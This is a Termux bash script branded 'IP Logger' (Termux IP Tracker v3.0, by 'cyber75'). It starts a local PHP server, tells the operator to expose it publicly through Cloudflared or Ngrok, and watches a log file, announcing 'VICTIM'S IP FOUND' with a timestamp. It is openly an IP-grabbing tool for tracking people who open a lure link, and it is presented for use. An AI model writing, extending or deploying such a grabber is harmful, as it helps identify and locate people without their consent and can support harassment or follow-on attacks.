#!/data/data/com.termux/files/usr/bin/bash

# Clear screen and show a clean header
clear
echo -e "\e[1;92m"
echo "  ██╗██████╗     ██╗      ██████╗  ██████╗  ██████╗ ███████╗██████╗ "
echo "  ██║██╔══██╗    ██║     ██╔═══██╗██╔════╝ ██╔════╝ ██╔════╝██╔══██╗"
echo "  ██║██████╔╝    ██║     ██║   ██║██║  ███╗██║  ███╗█████╗  ██████╔╝"
echo "  ██║██╔═══╝     ██║     ██║   ██║██║   ██║██║   ██║██╔══╝  ██╔══██╗"
echo "  ██║██║         ███████╗╚██████╔╝╚██████╔╝╚██████╔╝███████╗██║  ██║"
echo "  ╚═╝╚═╝         ╚══════╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝"
echo ""
echo "                                                                  - cyber75"
echo -e "\e[0m"
echo -e "\e[1;77m              >> Termux IP Tracker v3.0 << \e[0m"
echo "--------------------------------------------------------------"

# Create/Clear the log file so we don't see old IPs
> log.txt

# Start PHP Server in the background
echo -e "\e[1;93m[+] Starting PHP Server on port 8080...\e[0m"
php -S 127.0.0.1:8080 > /dev/null 2>&1 &
PHP_PID=$!

echo -e "\e[1;34m[!] Local Link: http://127.0.0.1:8080\e[0m"
echo -e "\e[1;34m[!] Tunnel: Open Cloudflared/Ngrok in a NEW SESSION\e[0m"
echo ""
echo -e "\e[1;91m[*] WAITING FOR VICTIM... (Press Ctrl+C to stop)\e[0m"
echo "--------------------------------------------------------------"

# Trap to kill PHP when you exit the script
trap "kill $PHP_PID; echo -e '\n\e[1;91m[!] Server Stopped.\e[0m'; exit" INT

# THE MONITOR: Watches log.txt and prints to screen instantly
tail -f log.txt | while read ip; do
    echo -e "\n\e[1;92m[!] VICTIM'S IP FOUND: \e[0m\e[1;77m$ip\e[0m"
    echo -e "\e[1;92m[+] Logged at: \e[0m$(date +%H:%M:%S)"
    echo -e "\e[1;92m--------------------------------------------------------------\e[0m"
done
